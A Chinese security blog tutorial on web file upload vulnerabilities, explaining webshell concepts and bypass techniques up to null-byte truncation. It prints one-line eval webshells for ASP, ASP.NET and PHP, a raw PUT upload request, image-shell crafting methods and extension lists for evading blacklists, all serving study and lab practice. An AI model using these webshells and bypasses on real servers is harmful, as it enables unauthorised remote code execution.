<!DOCTYPE HTML>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    

    <title>文件上传漏洞 | 2h0nG&#39;s Blog</title>
    <meta name="author" content="John Doe">
    
    <meta name="description" content="Love is friendship fell into love">
    
    
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    <meta property="og:title" content="文件上传漏洞"/>
    <meta property="og:site_name" content="2h0nG&#39;s Blog"/>

    
    <meta property="og:image" content=""/>
    

    <link rel="icon" type="image/png" href="/favicon.png">
    <link rel="alternate" href="/atom.xml" title="2h0nG&#39;s Blog" type="application/atom+xml">
    <link rel="stylesheet" href="/css/lib/materialize.min.css">
    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">

    
        <link rel="stylesheet" href="/css/lib/prettify-tomorrow-night-eighties.css" type="text/css">
    
    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
<meta name="generator" content="Hexo 5.0.0"></head>


<body>
    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">

    <nav class="indigo">
    <div class="nav-wrapper">
        <a href="#" data-activates="main-menu" class="button-collapse">
            <i class="fa fa-navicon"></i>
        </a>
        <div class="">
            <a href="/" class="brand-logo hide-on-med-and-down">2h0nG&#39;s Blog</a>
            <ul class="right hide-on-med-and-down">
                
                    <li>
                        <a class="menu-home " href="/" >
                            <i class="fa fa-home "></i>
                            
                            首页
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-archive " href="/archives" >
                            <i class="fa fa-archive "></i>
                            
                            归档
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
                            <i class="fa fa-bookmark "></i>
                            
                            分类
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-reading " href="/reading" >
                            <i class="fa fa-book "></i>
                            
                            读书
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-about " href="/about" >
                            <i class="fa fa-user "></i>
                            
                            关于
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-search modal-trigger " href="#search" >
                            <i class="fa fa-search "></i>
                            
                            搜索
                        </a>
                    </li>
                
            </ul>
            <div>
    <ul class="side-nav indigo darken-1" id="main-menu">
        
        <li class="side-user">
            <div class="row">
                <div class="col s4 no-padding">
                    <img class="avatar-image circle responsive-img" src="http://ww2.sinaimg.cn/small/74990035jw1f1rjkd681bj20rs0rsdhg.jpg" alt="User Avatar">
                </div>
                <div class="info col s8 valign-wrapper no-padding">
                    <div class="valign">
                        <p class="name">2h0nG</p>
                        <p class="desc">不断学习中</p>
                    </div>
                </div>
            </div>
        </li>
        

        
            <li class="no-padding">
                <a class="waves-effect menu-home " href="/" >
                    <i class="fa fa-home "></i>
                    
                    首页
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-archive " href="/archives" >
                    <i class="fa fa-archive "></i>
                    
                    归档
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
                    <i class="fa fa-bookmark "></i>
                    
                    分类
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-reading " href="/reading" >
                    <i class="fa fa-book "></i>
                    
                    读书
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-about " href="/about" >
                    <i class="fa fa-user "></i>
                    
                    关于
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-search modal-trigger " href="#search" >
                    <i class="fa fa-search "></i>
                    
                    搜索
                </a>
            </li>
        
    </ul>

    <ul class="side-nav indigo darken-1" id="category-menu">
    

            

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/数据通信安全/">
                    数据通信安全 <span class="right">30 篇</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/代码审计安全/">
                    代码审计安全 <span class="right">9 篇</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/Linux系统安全/">
                    Linux系统安全 <span class="right">12 篇</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/Web渗透测试/">
                    Web渗透测试 <span class="right">23 篇</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/CTF笔记/">
                    CTF笔记 <span class="right">15 篇</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/Python学习/">
                    Python学习 <span class="right">3 篇</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/Leetcode题解/">
                    Leetcode题解 <span class="right">24 篇</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/漏洞复现与分析/">
                    漏洞复现与分析 <span class="right">1 篇</span></a>
                </a>
            </li>

        

    </ul>
</div>

        </div>
    </div>
</nav>

<div id="search" class="modal search-modal">
    <div class="row">
        <div class="input-field col s12">
              <input id="search-input" type="text">
              <label for="search-input">搜索</label>
        </div>

    </div>
    <div id="search-result" class="search-result col s12">

    </div>
</div>


    <main>
        <div class="container main-container">
    <nav class="page-nav hide-on-small-only">
    <div class="nav-wrapper indigo">
        <span class="breadcrumb">当前位置（分类目录）</span>
        
            
    
    
    <a class="breadcrumb" href="/categories/Web渗透测试/">Web渗透测试</a>


        

        
    </div>
</nav>

<article>
    <div class="card">
        <div class="card-content">
            

            <div class="article-title">
                
    
        <h1>文件上传漏洞</h1>
    


            </div>
            <time class="pink-link-context" datetime="2020-08-06T08:16:16.000Z"><a href="/2020/08/06/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/8%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">2020-08-06</a></time>

            <span id="busuanzi_container_page_pv" class="read-times-container">
    <i class="fa fa-eye"></i>
    <span id="busuanzi_value_page_pv"></span>
</span>

            
    <div class="tags-row">
        
            <a href="/tags/Web渗透测试/" class="chip pink lighten-1">Web渗透测试</a>
        
    </div>


            <div class="toc pink-link-context hide-on-med-and-down">
    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="section table-of-contents-text">文件上传漏洞</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%80%E3%80%81%E6%A6%82%E8%BF%B0"><span class="section table-of-contents-text">一、概述</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E3%80%81%E5%A4%A7%E9%A9%AC%E4%B8%8E%E5%B0%8F%E9%A9%AC%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="section table-of-contents-text">二、大马与小马的概念</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%89%E3%80%81Web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="section table-of-contents-text">三、Web文件上传漏洞利用的条件</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%9B%9B%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="section table-of-contents-text">四、文件上传漏洞的防御与利用</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#1%E3%80%81%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%AD%96%E7%95%A5-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="section table-of-contents-text">1、黑白名单策略(访问控制)</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#2%E3%80%81PUT%E6%96%B9%E6%B3%95%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%EF%BC%88%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98%E7%9A%84%E5%85%B8%E5%9E%8B%EF%BC%8C%E5%8D%B4%E5%BE%88%E5%B0%91%E8%A7%81%EF%BC%89"><span class="section table-of-contents-text">2、PUT方法上传文件（配置问题的典型，却很少见）</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#3%E3%80%81%E5%89%8D%E7%AB%AFJS%E7%9A%84%E9%99%90%E5%88%B6%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="section table-of-contents-text">3、前端JS的限制与绕过</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#4%E3%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87"><span class="section table-of-contents-text">4、服务器端检测绕过</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-5"><a class="section table-of-contents-link" href="#1%EF%BC%89%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%AF%B9%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%A3%80%E6%9F%A5%E4%BE%9D%E8%B5%96%E4%BA%8EHTTP%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87%E4%B8%AD%E7%9A%84MIME%E7%B1%BB%E5%9E%8B%EF%BC%9A"><span class="section table-of-contents-text">1）服务器端对文件类型的检查依赖于HTTP请求报文中的MIME类型：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-5"><a class="section table-of-contents-link" href="#2%EF%BC%89%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="section table-of-contents-text">2）服务器端检测文件内容：</span></a></li><li class="section table-of-contents-item section table-of-contents-level-5"><a class="section table-of-contents-link" href="#3%EF%BC%89%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D"><span class="section table-of-contents-text">3）服务器端检查文件后缀名</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#5%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%9400%E6%88%AA%E6%96%AD"><span class="section table-of-contents-text">5、文件上传漏洞——00截断</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#6%E3%80%81%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94-htaccess%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="section table-of-contents-text">6、配置文件上传漏洞——.htaccess文件攻击</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#7%E3%80%81Web%E5%AE%B9%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="section table-of-contents-text">7、Web容器解析漏洞</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-5"><a class="section table-of-contents-link" href="#%E2%91%A0Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%881-x-2-x%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="section table-of-contents-text">①Apache解析漏洞（1.x 2.x漏洞）</span></a></li><li class="section table-of-contents-item section table-of-contents-level-5"><a class="section table-of-contents-link" href="#%E2%91%A1IIS6-0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="section table-of-contents-text">②IIS6.0解析漏洞</span></a></li><li class="section table-of-contents-item section table-of-contents-level-5"><a class="section table-of-contents-link" href="#%E2%91%A2Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="section table-of-contents-text">③Nginx解析漏洞</span></a></li><li class="section table-of-contents-item section table-of-contents-level-5"><a class="section table-of-contents-link" href="#%E2%91%A3PHP-CGI%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="section table-of-contents-text">④PHP CGI解析漏洞</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#8%E3%80%81%E4%B8%80%E4%BA%9B%E5%9C%A8%E7%BA%BF%E7%BC%96%E8%BE%91%E5%99%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="section table-of-contents-text">8、一些在线编辑器的文件上传漏洞</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-5"><a class="section table-of-contents-link" href="#%E2%91%A0ewebeditor"><span class="section table-of-contents-text">①ewebeditor</span></a></li><li class="section table-of-contents-item section table-of-contents-level-5"><a class="section table-of-contents-link" href="#%E2%91%A1fckeditor"><span class="section table-of-contents-text">②fckeditor</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#9%E3%80%81%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81CMS%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="section table-of-contents-text">9、一些常见CMS的文件上传漏洞</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#10%E3%80%81-DATA%E6%96%87%E4%BB%B6%E6%B5%81%E7%BB%95%E8%BF%87"><span class="section table-of-contents-text">10、::$DATA文件流绕过</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#11%E3%80%81%E5%90%8E%E7%BC%80%E5%90%8D-%E7%A9%BA%E6%A0%BC%E4%B8%8A%E4%BC%A0"><span class="section table-of-contents-text">11、后缀名+空格上传</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#12%E3%80%81%E5%90%8E%E7%BC%80%E5%90%8D-%E7%82%B9%E4%B8%8A%E4%BC%A0"><span class="section table-of-contents-text">12、后缀名+点上传</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%94%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Upload-lab"><span class="section table-of-contents-text">五、文件上传靶场——Upload-lab</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#PASS-01%EF%BC%9A%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B%E4%BE%9D%E8%B5%96%E5%89%8D%E7%AB%AFJS%E4%BB%A3%E7%A0%81"><span class="section table-of-contents-text">PASS-01：文件检测依赖前端JS代码</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#PASS-02%EF%BC%9A%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B%E4%BE%9D%E8%B5%96%E4%BA%8EMIME%E7%B1%BB%E5%9E%8B"><span class="section table-of-contents-text">PASS-02：文件检测依赖于MIME类型</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#PASS-04%EF%BC%9A%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94-htaccess"><span class="section table-of-contents-text">PASS-04：配置文件上传漏洞——.htaccess</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#PASS-11%EF%BC%9A00%E6%88%AA%E6%96%AD"><span class="section table-of-contents-text">PASS-11：00截断</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#PASS-14%EF%BC%9A%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B%E4%BE%9D%E8%B5%96%E4%BA%8Egetimagesize-%E5%87%BD%E6%95%B0"><span class="section table-of-contents-text">PASS-14：文件检测依赖于getimagesize()函数</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link"><span class="section table-of-contents-text"></span></a></li></ol></li></ol></li></ol>
</div>


            <div class="entry pink-link-context">
                <h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><p>服务器没有对上传文件进行足够的过滤与配置，使得Web用户可以上传任意文件、恶意脚本文件、exe程序等。</p>
<h3 id="二、大马与小马的概念"><a href="#二、大马与小马的概念" class="headerlink" title="二、大马与小马的概念"></a>二、大马与小马的概念</h3><p>1、大马：php、asp、aspx等脚本语言所写，代码量很大，可以做的事情非常多。</p>
<p>2、小马：一句话木马，通常配合中国菜刀或蚁剑来使用。中国菜刀在连接一句话木马时需要填写密码（实际上就是变量名，下面的例子就是cmd）。</p>
<blockquote>
<p>中国菜刀与一句话木马配合实现的三大功能：</p>
<p>1、文件管理；2、虚拟终端；3、数据库管理</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ASP:</span><br><span class="line">&lt;%eval request(&#39;cmd&#39;)%&gt;</span><br><span class="line">ASP.NET:</span><br><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%eval(Request.Item[&quot;cmd&quot;],&quot;unsafe&quot;);%&gt;</span><br><span class="line">PHP:</span><br><span class="line">&lt;?php @eval($_REQUEST[&#39;cmd&#39;]);?&gt;</span><br><span class="line">#GET不行</span><br></pre></td></tr></table></figure>

<h3 id="三、Web文件上传漏洞利用的条件"><a href="#三、Web文件上传漏洞利用的条件" class="headerlink" title="三、Web文件上传漏洞利用的条件"></a>三、Web文件上传漏洞利用的条件</h3><p>1、Web服务器要开启文件上传功能，并且上传接口对外开放。</p>
<p>2、Web用户对于目标目录具有可写权限，甚至执行权限。（一般情况下Web目录都有执行权限）</p>
<p>3、Web容器可以解析脚本， 具备解析脚本的环境，这样就可以解析执行我们上传的文件。</p>
<p>4、服务器配置不当，开启了PUT方法，可直接上传。</p>
<h3 id="四、文件上传漏洞的防御与利用"><a href="#四、文件上传漏洞的防御与利用" class="headerlink" title="四、文件上传漏洞的防御与利用"></a>四、文件上传漏洞的防御与利用</h3><h4 id="1、黑白名单策略-访问控制"><a href="#1、黑白名单策略-访问控制" class="headerlink" title="1、黑白名单策略(访问控制)"></a>1、黑白名单策略(访问控制)</h4><p>URLBlacklist、URLWhitelist，对用户允许和禁止访问的网页写入名单。</p>
<h4 id="2、PUT方法上传文件（配置问题的典型，却很少见）"><a href="#2、PUT方法上传文件（配置问题的典型，却很少见）" class="headerlink" title="2、PUT方法上传文件（配置问题的典型，却很少见）"></a>2、PUT方法上传文件（配置问题的典型，却很少见）</h4><p>属于HTTP请求方法之一，如果服务器允许，直接通过HTTP请求数据包即可上传文件。</p>
<p>1）测试服务器是否允许PUT请求方法</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过telnet测试服务器支持的HTTP请求方法：</span></span><br><span class="line">----</span><br><span class="line">OPTIONS / HTTP/1.1</span><br><span class="line">HOST:192.168.2.144</span><br><span class="line">----</span><br></pre></td></tr></table></figure>

<p>2）服务器PUT请求方法的相关配置</p>
<p>Apache开启PUT文件上传的方法,httpd.conf配置文件：（配置后虽然OPTION不显示，但可以文件上传)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入模块,开启下面两条配置</span></span><br><span class="line">LoadModule dav_module modules/mod_dav.so</span><br><span class="line">LoadModule dav_fs_module modules/mod_dav_fs.so</span><br><span class="line"><span class="comment">#开启模块</span></span><br><span class="line">DocumentRoot  <span class="string">&quot;E:\phpStudy\WWW&quot;</span></span><br><span class="line">&lt;Directory /&gt;</span><br><span class="line">    Options +Indexes +FollowSymLinks +ExecCGI</span><br><span class="line">    AllowOverride All</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">    Require all granted</span><br><span class="line">    DAV On    <span class="comment">#此处加一行开启</span></span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"><span class="comment">#开启文件锁</span></span><br><span class="line">DavLockDB C:\phpstudy\www\DavLock    <span class="comment">#把此行放在配置文件第一行</span></span><br><span class="line">并且在C:\phpstudy\www\目录下的创建文件DavLock</span><br></pre></td></tr></table></figure>

<p>3）PUT方式上传文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUT /info1.php HTTP/<span class="number">1.1</span></span><br><span class="line">HOST: <span class="number">192.168</span><span class="number">.43</span><span class="number">.196</span></span><br><span class="line">Content-Length: <span class="number">18</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="3、前端JS的限制与绕过"><a href="#3、前端JS的限制与绕过" class="headerlink" title="3、前端JS的限制与绕过"></a>3、前端JS的限制与绕过</h4><p>1）删除JS；2）先通过JS，后BP修改数据包</p>
<h4 id="4、服务器端检测绕过"><a href="#4、服务器端检测绕过" class="headerlink" title="4、服务器端检测绕过"></a>4、服务器端检测绕过</h4><h5 id="1）服务器端对文件类型的检查依赖于HTTP请求报文中的MIME类型："><a href="#1）服务器端对文件类型的检查依赖于HTTP请求报文中的MIME类型：" class="headerlink" title="1）服务器端对文件类型的检查依赖于HTTP请求报文中的MIME类型："></a><u>1）服务器端对文件类型的检查依赖于HTTP请求报文中的MIME类型</u>：</h5><p>MIME（Multipurpose Internet Mail Extensions）是描述消息内容类型的因特网标准。MIME消息能包含文本、图像、音频、视频以及其它应用程序专用的数据。常见的MIME类型如下。在HTTP协议中，使用Content-Type字段表示文件MIME的类型。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Mime-Type：</span></span><br><span class="line">.JS:    application/x-javascript</span><br><span class="line">.HTML:    text/html</span><br><span class="line">.php:    text/php</span><br><span class="line">.jpg:    image/jpeg</span><br><span class="line">.png:    image/png</span><br><span class="line">.pdf:    application/pdf</span><br></pre></td></tr></table></figure>

<p>因此，可通过修改请求报文中的Content-Type类型绕过检测。</p>
<h5 id="2）服务器端检测文件内容："><a href="#2）服务器端检测文件内容：" class="headerlink" title="2）服务器端检测文件内容："></a><u>2）服务器端检测文件内容：</u></h5><p>PHP函数getimagesize()除了可以计算图片的大小，在计算之前还会对文件的类型是否是图片做判断，因此有些PHP后端常使用该函数进行文件检查。exif_imagetype()检查文件头几个字节来区分不同的图片格式。</p>
<p>对于检测内容的情况，可以制作图片木马，也就是图片格式的文件，里面输入了木马语句。</p>
<p><u>制作图片马的方法：</u></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#方法1、GIF图片的例子</span></span><br><span class="line">GIF89a    <span class="comment">#gif文件欺骗，可通过getimagesize/exif_imagetype</span></span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();&gt;</span><br><span class="line"><span class="comment">#方法2、DOS命令，合并木马和图片</span></span><br><span class="line">copy 图片/b+木马.php/a 生成的图片名</span><br><span class="line"><span class="comment">#方法3、利用十六进制编辑器,写入后Notepad HEX转ASCII，然后写木马</span></span><br><span class="line">.gif:<span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span> F1 <span class="number">00</span> <span class="number">2</span>C <span class="number">01</span> F7 <span class="number">00</span> <span class="number">00</span> <span class="number">64</span> <span class="number">32</span> <span class="number">33</span></span><br><span class="line">.jpg:FF D8 FF E0 <span class="number">00</span> <span class="number">10</span> <span class="number">4</span>A <span class="number">46</span> <span class="number">49</span> <span class="number">46</span> <span class="number">00</span> <span class="number">01</span> <span class="number">01</span> <span class="number">01</span> <span class="number">01</span> <span class="number">2</span>C</span><br><span class="line">.png:<span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span> <span class="number">0</span>D <span class="number">0</span>A <span class="number">1</span>A <span class="number">0</span>A <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>D <span class="number">49</span> <span class="number">48</span> <span class="number">44</span> <span class="number">52</span> / 文件头 <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span> <span class="number">0</span>D <span class="number">0</span>A <span class="number">1</span>A <span class="number">0</span>A + 数据块 + 数据块 + 数据块……</span><br></pre></td></tr></table></figure>

<h5 id="3）服务器端检查文件后缀名"><a href="#3）服务器端检查文件后缀名" class="headerlink" title="3）服务器端检查文件后缀名"></a><u>3）服务器端检查文件后缀名</u></h5><p>服务器端在检测文件名时，一般会采用黑白名单策略，不允许上传php|asp|aspx|jsp…等可执行脚本文件；白名单只允许上传jpg|gif|png|doc|rar…等格式的文件。</p>
<p>① - 可以尝试不同的脚本别名，来尝试绕过黑名单限制。例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.php .php2 .php3 .php5 .phtml  | .pht .phps .php3p .php4 </span><br><span class="line">.asp .aspx .ascx .ashx .asa .cer</span><br><span class="line">.jsp .jspx</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">werner@Yasser:~$ cat /etc/mime.types | grep php</span><br><span class="line">  <span class="comment">#application/x-httpd-php          phtml pht php</span></span><br><span class="line">  <span class="comment">#application/x-httpd-php-source           phps</span></span><br><span class="line">  <span class="comment">#application/x-httpd-php3         php3</span></span><br><span class="line">  <span class="comment">#application/x-httpd-php3-preprocessed        php3p</span></span><br><span class="line">  <span class="comment">#application/x-httpd-php4         php4</span></span><br><span class="line">  <span class="comment">#application/x-httpd-php5         php5</span></span><br><span class="line">当web服务器收到静态的资源文件请求时，依据请求文件的后缀名在服务器的MIME配置文</span><br><span class="line">件中找到对应的MIME Type，再根据MIME Type设置HTTP Response的Content-Type，然</span><br><span class="line">后浏览器根据Content-Type的值处理文件。</span><br></pre></td></tr></table></figure>

<p>② - 对于后缀的白名单策略，我们只能上传在白名单内的文件后缀名。</p>
<h4 id="5、文件上传漏洞——00截断"><a href="#5、文件上传漏洞——00截断" class="headerlink" title="5、文件上传漏洞——00截断"></a>5、文件上传漏洞——00截断</h4><blockquote>
<p>CVE-2006-7243 php版本 &lt; 5.3.4 此漏洞存在</p>
</blockquote>
<p><u>当上传文件的数据包暴露上传文件的路径时</u>，我们可以采用%00截断，将上传文件的路径文件夹名命名为一个php文件，之后采用在文件名后加一个%00截断后面的真实文件名字符串拼接。</p>
